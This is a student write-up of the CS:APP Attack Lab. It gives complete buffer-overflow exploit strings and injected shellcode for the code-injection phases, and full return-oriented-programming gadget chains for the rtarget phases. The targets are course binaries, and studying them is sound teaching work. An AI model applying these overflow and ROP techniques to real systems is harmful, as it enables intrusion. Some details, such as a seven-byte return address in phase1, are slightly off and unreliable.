### 准备

#### Files

-   ctarget: &ensp; An executable program vulnerable to code-injection attacks
-   rtarget: &ensp; An executable program vulnerable to return-oriented-programming attacks
-   cookie.txt: &ensp; An 8-digit hex code that you will use as a unique identifier in your attacks.
-   farm.c: &ensp; The source code of your target's "gadget farm", which you will use in generating return-oriented
    programming attacks.
-   hex2raw: &ensp; A utility to generate attack strings

#### Target Program

=== "C source code"

    ```C
    unsigned getbuf() {
        char buf[BUFFER_SIZE];
        Gets(buf);
        return 1;
    }
    ```

=== "assembly"

    ```objdump
    00000000004017a8 <getbuf>:
        4017a8:	48 83 ec 28          	sub    $0x28,%rsp
        4017ac:	48 89 e7             	mov    %rsp,%rdi
        4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
        4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
        4017b9:	48 83 c4 28          	add    $0x28,%rsp
        4017bd:	c3                   	retq
        4017be:	90                   	nop
        4017bf:	90                   	nop
    ```

`ctarget` 和 `rtarget` 都通过 `getbuf` 从标准输入中读入字符串 (terminated by `\n`) 并存储 (along with a null terminator)，需要注意:

-   exploit string 的任何位置都不能包含 `0x0a` (ascii for `\n`)
-   通过反汇编查看 `BUFFER_SIZE`

#### Using `hex2raw`

将需要的十六进制码转换为字符串作为 `target` 的输入，可以通过以下方式:

1.&ensp;set a series of pipes

```console
cat exploit.txt | ./hex2raw | ./ctarget -q
```

2.&ensp;store the raw string in a file and use I/O redirection

```console
./hex2raw < exploit.txt > exploit-raw.txt
./ctarget < exploit-raw.txt
```

#### Generating Byte Codes

```console
gcc -c example.s
objdump -d example.o > example.d
```

#### 知识回顾

函数调用过程: &ensp; 保存状态 → 传参 → `call` → 开栈 → ... → 释放 → `ret`

### Part I: Code Injection Attacks

用 exploit string 攻击 `ctarget` 程序，`getbuf` 被 `test` 函数调用

```C
void test() {
    int val;
    val = getbuf();
    printf("No exploit.  Getbuf returned 0x%x\n", val);
}
```

通过 `getbuf` 改变 buffer，使其无法安全返回 `test`

#### phase1

phase1 不要求注入新代码，只需让 `getbuf` 返回到 `touch1`，C rep:

=== "touch1"

    ```C
    void touch1() {
        vlevel = 1;    /* Part of validation protocol */
        printf("Touch1!: You called touch1()\n");
        validate(1);
        exit(0);
    }
    ```

=== "phase1.txt"

    ```console
    /* padding 40 bytes */
    ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee
    ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee

    /* return: first address of touch1() */
    c0 17 40 00 00 00 00
    ```

只需要填充 `0x28` 个字节后，用 `touch1` 的地址 `0x4017c0` 覆盖 `test` 的栈帧，注意小端法

#### phase2

phase2 需要返回到 `touch2`，返回之前还要调用注入的代码用于传参，使 `val == cookie`

=== "touch2"

    ```C
    void touch2(unsigned val) {
        vlevel = 2;
        if (val == cookie) {
            printf("Touch2!: You called touch2(0x%.8x)\n", val);
            validate(2);
        } elee {
            printf("Misfire: You called touch2(0x%.8x)\n", val);
            fail(2);
        }
        exit(0);
    }
    ```

=== "phase2.s"

    ```asm
    pushq  $0x4017ec          # first address of touch2
    mov    $0x59b997fa, %rdi  # cookie
    ret
    ```

=== "phase2.d"

    ```objdump
    0000000000000000 <.text>:
        0:	68 ec 17 40 00       	pushq  $0x4017ec
        5:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
        c:	c3                   	retq
    ```

=== "phase2.txt"

    ```console
    /* padding 40 bytes */
    ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee
    ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee

    /* return: injectied codes at 0x5561dca0 + 8 */
    a8 dc 61 55 00 00 00 00

    /* encoding of injected codes */
    68 ec 17 40 00 48 c7 c7 fa 97 b9 59 c3
    ```

通过 gdb 查看 `getbuf` 栈帧尾端的地址为 `0x5561dca0`，然后破坏 `test` 的栈帧，修改返回值，把注入的代码存放在 `0x5561dca8`。(不要使用 `call` 或 `jmp` 进行跳转)

#### phase3

Level3 与 Level2 相似，但需要传一个字符串指针，使 cookie 的字符串形式与传入的字符串相等

=== "touch3"

    ```C
    void touch3(char *sval) {
        vlevel = 3; /* Part of validation protocol */
        if (hexmatch(cookie, sval)) {
            printf("Touch3!: You called touch3(\"%s\")\n", sval);
            validate(3);
        } else {
            printf("Misfire: You called touch3(\"%s\")\n", sval);
            fail(3);
        }
        exit(0);
    }
    ```

=== "hexmatch"

    ```C
    /* Compare string to hex represention of unsigned value */
    int hexmatch(unsigned val, char *sval) {
        char cbuf[110];
        /* Make position of check string unpredictable */
        char *s = cbuf + random() % 100;
        sprintf(s, "%.8x", val);
        return strncmp(sval, s, 9) == 0;
    }
    ```

=== "phase3.s"

    ```asm
    pushq  $0x4018fa          # first address of touch3
    mov    $0x5561dca8, %rdi  # address of string constructed manually
    ret
    ```

=== "phase3.d"

    ```objdump
    0000000000000000 <.text>:
        0:	68 fa 18 40 00       	pushq  $0x4018fa
        5:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
        c:	c3
    ```

=== "phase3.txt"

    ```console
    /* padding: 40 bytes */
    ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee
    ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee

    /* return: injected codes at 0x5561dca0 + 8 + 9 */
    b1 dc 61 55 00 00 00 00

    /* string format of cookie */
    35 39 62 39 39 37 66 61 00

    /* encoding of injected codes */
    68 fa 18 40 00 48 c7 c7 a8 dc 61 55 c3
    ```

因此在栈帧尾部顺放 cookie 的字符串形式，再放置注入的代码。尽管 `touch3` 调用其他函数，但注入内容都放在了 `test` 的栈帧内，不必担心被破坏。

### Part II: Return-Oriented Programming

`rtarget` uses two techniques to thwart such attacks:

-   Uses randomization, so the stack positions differ from one run to another.
-   Marks the section of memory holding the stack as nonexecutable, so even if you could set the
    program counter to the start of your injected code, the program would fail with a segmentation fault.

The strategy with ROP is to <u>identify byte sequences within an existing program</u> that consist of one or more instructions followed by the instruction `ret`.

<font class="i_n_a%10&10_b%10&110" id="setting up stack">
<img src="../img/gadgets.png" width=540>
</font>

Gadgets may not be enough to implement many important operations. Fortunately, with a byte-oriented instruction set, such as x86-64, a gadget can often be found by extracting patterns from other parts of the instruction byte sequence. For example:

=== "setval_210.c"

    ```C
    void setval_210(unsigned *p) {
        *p = 3347663060U;
    }
    ```

=== "setval_210.d"

    ```objdump
    000000000400f15 <setval_210>:
        400f15:     c7 07 d4 48 89 c7     movl  $0xc78948d4, (%rdi)
        400f1b:     c3                    retq
    ```

The byte sequence `48 89 c7` encodes the instruction `movq %rax, %rdi`. Thus, this code contains a gadget, having a starting address of `0x400f18`.

<!-- prettier-ignore-start -->
??? hint "byte encoding of instructions"
    <img src="../img/gadgeti1.png"><br>
    <img src="../img/gadgeti2.png">
<!-- prettier-ignore-end -->

#### phase4

使用 gadget farm 中的 gadget (最多两个)，对 `rtarget` 做和 phase2 一样的事:

-   首先修改返回地址，使之跳转到第一个 gadget
-   gadget 需要把 cookie `pop` 到一个寄存器 `r`，然后 `mov r, %rdi`，最后返回到 `touch2`

因此，首先搜索 `pop r` 的编码，然后再搜索对应的 `mov r, %rdi` 编码

=== "used gadgets"

    ```objdump
    00000000004019a7 <addval_219>:
    4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
    4019ad:	c3                   	retq
    ... ...
    00000000004019c3 <setval_426>:
    4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
    4019c9:	c3
    ```

=== "phase4.txt"

    ```console
    /* padding: 40 bytes */
    ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee
    ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee

    /* gadget1: pop %rax; retq (58 c3) */
    ab 19 40 00 00 00 00 00

    /* cookie */
    fa 97 b9 59 00 00 00 00

    /* gadget2: movq %rax, %rdi; retq (48 89 c7 c3) */
    c5 19 40 00 00 00 00 00

    /* first address of touch2 */
    ec 17 40 00 00 00 00 00
    ```

#### phase5

做和 phase3 的一样的事，即传入一个字符串的地址；难点在于，由于栈随机化，需要使用 `%rsp` 的值。首先在 gadgets 中查找可用的 `mov` pattern:

<font class="t_a%0&0_b%40_h%3&0">

| byte encoding    | instruction       | address    |
| :--------------- | :---------------- | :--------- |
| `48 89 c7 90 c3` | `movq %rax, %rdi` | `0x4019c3` |
| `48 89 e0 c3`    | `movq %rsp, %rax` | `0x401a03` |
| `89 c2 90 c3`    | `movl %eax, %edx` | `0x4019db` |
| `89 ce 90 90 c3` | `movl %ecx, %esi` | `0x401a11` |
| `89 d1 38 c9`    | `movl %edx, %ecx` | `0x401a33` |

</font>

gadgets 中还提供了一个 `add_xy` 函数，结合存在的 `mov` pattern，可以先由 `add_xy` 计算字符串的地址，再传入 `touch3`

??? hint "phase5 answers"

    === "used gadgets"

        ```objdump
        00000000004019a7 <addval_219>:
            4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
            4019ad:	c3                   	retq
        ... ...
        00000000004019db <getval_481>:
            4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
            4019e0:	c3
        ... ...
        00000000004019c3 <setval_426>:
            4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
            4019c9:	c3                   	retq
        ... ...
        0000000000401a03 <addval_190>:
            401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
            401a09:	c3                   	retq
        ... ...
        0000000000401a11 <addval_436>:
            401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
            401a17:	c3                   	retq
        ... ...
        0000000000401a33 <getval_159>:
            401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
            401a38:	c3                      retq
        ... ...
        00000000004019d6 <add_xy>:
            4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
            4019da:	c3                   	retq
        ```

    === "phase5.txt"

        ```console
        /* padding: 40 bytes */
        ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee
        ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee

        /* gadget1: movq  %rsp, %rax;  retq (48 89 e0 c3) */
        06 1a 40 00 00 00 00 00

        /* gadget2: movq  %rax, %rdi;  retq (48 89 c7 90 c3) */
        c5 19 40 00 00 00 00 00

        /* gadget3: popq %rax;  retq (58 90 c3) */
        ab 19 40 00 00 00 00 00

        /* bias: 72 */
        48 00 00 00 00 00 00 00

        /* gadget4: movl  %eax, %edx;  retq (89 c2 90 c3) */
        dd 19 40 00 00 00 00 00

        /* gadget5: movl  %edx, %ecx;  retq (89 d1 38 c9 c3) */
        34 1a 40 00 00 00 00 00

        /* gadget6: movl  %ecx, %esi;  retq (89 ce 90 90 c3) */
        13 1a 40 00 00 00 00 00

        /* gadget7: add_xy: %rax = %rdi + %rsi */
        d6 19 40 00 00 00 00 00

        /* gadget8: movq  %rax, %rdi;  retq (48 89 c7 c3) */
        c5 19 40 00 00 00 00 00

        /* first address of touch3 */
        fa 18 40 00 00 00 00 00

        /* string format of cookie */
        35 39 62 39 39 37 66 61 00
        ```
